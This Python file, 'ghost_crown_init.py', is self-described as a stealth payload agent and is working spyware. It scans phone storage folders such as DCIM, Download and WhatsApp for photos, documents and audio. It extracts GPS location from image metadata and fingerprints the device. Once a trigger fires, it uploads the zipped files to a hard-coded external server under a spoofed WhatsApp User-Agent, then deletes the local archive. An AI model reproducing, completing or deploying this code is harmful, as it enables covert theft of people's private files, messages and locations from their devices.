# ghost_crown_init.py
# MAZLABZ Terminal - Real Payload Stealth Agent

import os
import platform
import hashlib
import time
import zipfile
import requests
import socket
import uuid
import json
from datetime import datetime
from pathlib import Path
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS

# === CONFIGURATION (HARD-CODED) === #
UPLOAD_ENDPOINT = "https://mazlabz-terminal-894383524313.us-central1.run.app/api/upload"
EXFIL_ENCRYPTION_PASSWORD = "n1ghtcr0wn"
MAX_ARCHIVE_SIZE_MB = 15
STAGING_DIR = "/opt/mazlabz/uploads"
LOG_FILE = "/opt/mazlabz/logs/ghost_crown.log"
TARGET_DIRS = ["/DCIM", "/Download", "/WhatsApp", "/mnt/media_rw"]
TARGET_EXTS = [".jpg", ".png", ".pdf", ".txt", ".docx", ".csv", ".3gp", ".aac"]
TRIGGER_FILE = "/Download/signal.txt"
TRIGGER_UPTIME_MIN = 10

Path(STAGING_DIR).mkdir(parents=True, exist_ok=True)
Path(os.path.dirname(LOG_FILE)).mkdir(parents=True, exist_ok=True)

def log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {msg}\n")

def get_system_fingerprint():
    props = [platform.system(), platform.machine(), platform.version(),
             socket.gethostname(), str(uuid.getnode()), str(os.cpu_count())]
    data = "::".join(props)
    return hashlib.sha256(data.encode()).hexdigest()[:12]

def extract_exif(path):
    gps = {}
    try:
        img = Image.open(path)
        exif_data = img._getexif()
        if not exif_data:
            return gps
        for tag, val in exif_data.items():
            decoded = TAGS.get(tag, tag)
            if decoded == "GPSInfo":
                for t in val:
                    sub_decoded = GPSTAGS.get(t, t)
                    gps[sub_decoded] = val[t]
    except:
        pass
    return gps

def scan_targets():
    results = []
    for directory in TARGET_DIRS:
        for root, _, files in os.walk(directory):
            for file in files:
                if any(file.lower().endswith(ext) for ext in TARGET_EXTS):
                    full_path = os.path.join(root, file)
                    try:
                        stat = os.stat(full_path)
                        gps = extract_exif(full_path) if file.lower().endswith(('.jpg', '.png')) else {}
                        results.append({
                            "path": full_path,
                            "size": stat.st_size,
                            "modified": stat.st_mtime,
                            "created": stat.st_ctime,
                            "gps": gps
                        })
                    except:
                        continue
    return results

def create_archive(files, crown_id):
    hexid = os.urandom(4).hex()
    archive_name = f"drop_{crown_id}_{hexid}.zip"
    archive_path = os.path.join(STAGING_DIR, archive_name)
    total_size = 0
    with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as z:
        for entry in files:
            path = entry['path']
            if os.path.exists(path):
                try:
                    total_size += os.path.getsize(path)
                    if total_size > MAX_ARCHIVE_SIZE_MB * 1024 * 1024:
                        break
                    z.write(path, arcname=os.path.basename(path))
                except:
                    continue
        # Add metadata.json
        meta = {
            "id": crown_id,
            "timestamp": str(datetime.now()),
            "file_count": len(files),
            "total_size": total_size,
            "system": platform.platform()
        }
        z.writestr("metadata.json", json.dumps(meta, indent=2))
    return archive_path

def uptime_minutes():
    try:
        with open("/proc/uptime", "r") as f:
            uptime_sec = float(f.readline().split()[0])
            return int(uptime_sec // 60)
    except:
        return 0

def check_trigger():
    return os.path.exists(TRIGGER_FILE) or uptime_minutes() > TRIGGER_UPTIME_MIN

def upload_archive(path):
    try:
        with open(path, 'rb') as f:
            files = {'file': (os.path.basename(path), f)}
            headers = {'User-Agent': 'WhatsApp'}
            r = requests.post(UPLOAD_ENDPOINT, files=files, headers=headers, timeout=20)
            if r.status_code == 200:
                log(f"Payload uploaded: {path}")
                os.remove(path)
            else:
                log(f"Upload failed ({r.status_code}): {path}")
    except Exception as e:
        log(f"Exception during upload: {str(e)}")

def main():
    crown_id = get_system_fingerprint()
    log(f"[+] GHOST CROWN INIT — ID: {crown_id}")
    found = scan_targets()
    log(f"[+] Files found: {len(found)}")
    if not found:
        log("[-] No files to process.")
        return
    archive_path = create_archive(found, crown_id)
    log(f"[+] Archive created: {archive_path}")
    while not check_trigger():
        time.sleep(30)
    upload_archive(archive_path)

if __name__ == "__main__":
    main()
